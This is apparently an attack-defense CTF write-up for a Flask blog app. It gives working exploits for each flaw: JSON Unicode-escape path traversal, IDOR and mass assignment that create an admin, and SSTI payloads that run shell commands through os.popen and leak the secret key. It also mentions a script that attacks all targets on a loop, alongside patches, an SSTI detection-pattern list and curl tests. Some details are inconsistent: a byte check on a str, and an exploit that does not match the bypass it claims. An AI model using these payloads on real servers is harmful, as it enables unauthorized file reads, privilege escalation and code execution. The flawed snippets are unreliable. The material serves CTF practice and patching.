# BabyPython - Vulnerability Analysis & Patches

## Overview
Flask blog application with multiple critical vulnerabilities allowing privilege escalation and arbitrary file read.

**Flag Location:** `/flag` on target servers  
**Target Port:** `5000`

---

## Vulnerabilities

### 1. Path Traversal with Unicode Escape Bypass (CRITICAL) ⚠️ PRIMARY EXPLOIT

**Affected Endpoint:** `POST /download_attachment`

**Description:**
The endpoint checks for `..` in the raw byte string but JSON Unicode escapes (`\u002e\u002e`) bypass this check. When JSON is parsed, `\u002e` becomes `.`, allowing path traversal.

**Vulnerable Code Pattern:**
```python
@app.route('/download_attachment', methods=['POST'])
def download_attachment():
    data = request.get_json()
    path = data.get('path', '')
    
    # VULNERABLE: checks raw bytes before JSON decoding
    if b'..' in path or b'flag' in path:  
        abort(400)
    
    # By this point, \u002e\u002e has become ..
    return send_file(path)
```

**Exploit:**
```python
def unicode_encode(s):
    """Encode each character as \\uXXXX"""
    return ''.join('\\u{:04x}'.format(ord(c)) for c in s)

# /flag becomes \u002f\u0066\u006c\u0061\u0067
encoded_path = unicode_encode('/flag')
payload = '{"path": "' + encoded_path + '"}'

r = session.post('/download_attachment', 
    data=payload,
    headers={'Content-Type': 'application/json'})
print(r.text)  # flag{...}
```

**Impact:** Direct flag read from `/flag`

**Patch:**
```python
def download_attachment():
    data = request.get_json()
    path = data.get('path', '')
    
    # SECURE: Check RESOLVED path, not raw input
    base_dir = os.path.realpath('static/attachments')
    full_path = os.path.realpath(os.path.join(base_dir, path))
    
    # Path must be within base directory
    if not full_path.startswith(base_dir + os.sep):
        abort(403, 'Path traversal detected')
    
    # Block flag access
    if 'flag' in full_path.lower():
        abort(403)
    
    return send_file(full_path)
```

---

### 2. IDOR - Insecure Direct Object Reference (CRITICAL)

**Affected Endpoints:**
- `GET/POST /admin/users` - List all users
- `GET/POST /admin/user/add` - Create new user
- `GET/POST /admin/user/edit/<id>` - Edit any user
- `POST /admin/user/delete/<id>` - Delete any user

**Description:**
Admin endpoints lack proper authorization checks. Any authenticated user can access admin functionality.

**Exploit:**
```python
# 1. Register and login as normal user
session.post('/register', data={'username': 'attacker', 'password': 'pass'})
session.post('/login', data={'username': 'attacker', 'password': 'pass'})

# 2. Create admin user via IDOR
session.post('/admin/user/add', data={
    'username': 'hacker_admin',
    'password': 'hacker123',
    'is_admin': '1'  # Mass assignment!
})

# 3. Login as new admin and access flag at /admin/panel
```

**Impact:** Full admin access, can read /flag from admin panel

**Patch:**
```python
from flask_login import current_user

def require_admin(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not current_user.is_authenticated or not current_user.is_admin:
            abort(403)
        return f(*args, **kwargs)
    return decorated

# Apply to all admin routes
@app.route('/admin/user/add')
@require_admin
def user_add():
    ...
```

---

### 2. Mass Assignment (CRITICAL)

**Affected Endpoints:**
- `POST /admin/user/add`
- `POST /admin/user/edit/<id>`

**Description:**
User creation/edit accepts `is_admin` field from form data, allowing privilege escalation.

**Exploit:**
```python
session.post('/admin/user/add', data={
    'username': 'newuser',
    'password': 'pass',
    'is_admin': 'true'  # Grants admin!
})
```

**Patch:**
```python
ALLOWED_FIELDS = {'username', 'password', 'avatar'}

@app.route('/admin/user/add', methods=['POST'])
@require_admin
def user_add():
    # Filter out is_admin from form data
    safe_data = {k: v for k, v in request.form.items() if k in ALLOWED_FIELDS}
    ...
```

---

### 3. Path Traversal in Download Attachment (HIGH)

**Affected Endpoint:** `POST /download_attachment`

**Description:**
The endpoint accepts a JSON path parameter and reads files without proper validation. Though `..` is blocked on some targets, encoding bypasses may work.

**Exploit:**
```python
session.post('/download_attachment', json={
    'path': '../../../flag'
})
```

**Patch:**
```python
def download_attachment():
    path = request.json.get('path', '')
    
    # Block traversal attempts
    if '..' in path or path.startswith('/'):
        abort(403)
    
    # Validate path stays within allowed directory
    base_dir = os.path.realpath('static/attachments')
    full_path = os.path.realpath(os.path.join(base_dir, path))
    
    if not full_path.startswith(base_dir):
        abort(403)
    
    return send_file(full_path)
```

---

### 4. Server-Side Template Injection (SSTI) (HIGH)

**Affected Endpoints:**
- `POST /create` (post content)
- `POST /edit/<id>` (post content)

**Description:**
Post content is rendered using Jinja2 Template.render() and displayed with `|safe` filter, allowing code execution.

**Exploit:**
```python
# In post content:
{{lipsum.__globals__['os'].popen('cat /flag').read()}}
{{config.SECRET_KEY}}
{{url_for.__globals__.__builtins__.open('/flag').read()}}
```

**Patch:**
```python
import re

SSTI_PATTERNS = [
    r'\{\{.*\}\}',
    r'\{%.*%\}',
    r'__class__',
    r'__mro__',
    r'__globals__',
    r'lipsum',
    r'cycler',
]

def contains_ssti(text):
    for pattern in SSTI_PATTERNS:
        if re.search(pattern, text, re.I):
            return True
    return False

@app.route('/create', methods=['POST'])
def create():
    content = request.form.get('content', '')
    if contains_ssti(content):
        abort(400, 'Invalid content')
    ...
```

---

### 5. Template File Write (MEDIUM)

**Affected Endpoint:** `POST /edit_template`

**Description:**
Allows writing to template files, enabling persistent SSTI.

**Patch:**
```python
@app.route('/edit_template')
@require_admin
def edit_template():
    abort(403, 'Disabled for security')
```

---

## Attack Chain for Flag Capture

### Method 1: Unicode Escape Path Traversal (WORKING - PRIMARY)
```
1. Register and login
2. POST /download_attachment with unicode-encoded path
3. Payload: {"path": "\u002f\u0066\u006c\u0061\u0067"}  (= /flag)
4. Flag returned directly in response
```

**Full Exploit:**
```bash
python3 exploit.py              # Attack all targets once
python3 exploit.py --loop       # Attack continuously
python3 exploit.py -t 172.28.36.32  # Attack single target
```

### Method 2: IDOR + Admin Panel (Backup)
```
1. Register normal user
2. Access /admin/user/add (IDOR)
3. Create user with is_admin=true (Mass Assignment)
4. Login as new admin
5. Access /admin/panel → reads /flag
```

### Method 3: SSTI in Post Content (Backup - if not patched)
```
1. Register and login
2. Create post with SSTI payload in content
3. View post → triggers template rendering
4. Flag appears in rendered output
```

---

## Quick Patch Application

```python
# In run_secure.py or at app startup:
from security_patches import apply_all_patches, register_security_middleware

app = create_app()
apply_all_patches(app)
register_security_middleware(app)
app.run()
```

---

## Files

| File | Purpose |
|------|---------|
| `web.py` | Exploit script using awd_lib framework |
| `src/security_patches.py` | Security patches module |
| `src/run_secure.py` | Wrapper to run patched app |

---

## Testing Patches

After applying patches, verify:

```bash
# IDOR should be blocked
curl -X POST http://localhost:5000/admin/user/add -d "username=test&password=test"
# Expected: 401 or 403

# Path traversal should be blocked
curl -X POST http://localhost:5000/download_attachment \
  -H "Content-Type: application/json" \
  -d '{"path":"../../../flag"}'
# Expected: 403

# SSTI should be blocked
curl -X POST http://localhost:5000/create \
  -d "title=test&content={{config}}"
# Expected: 400
```
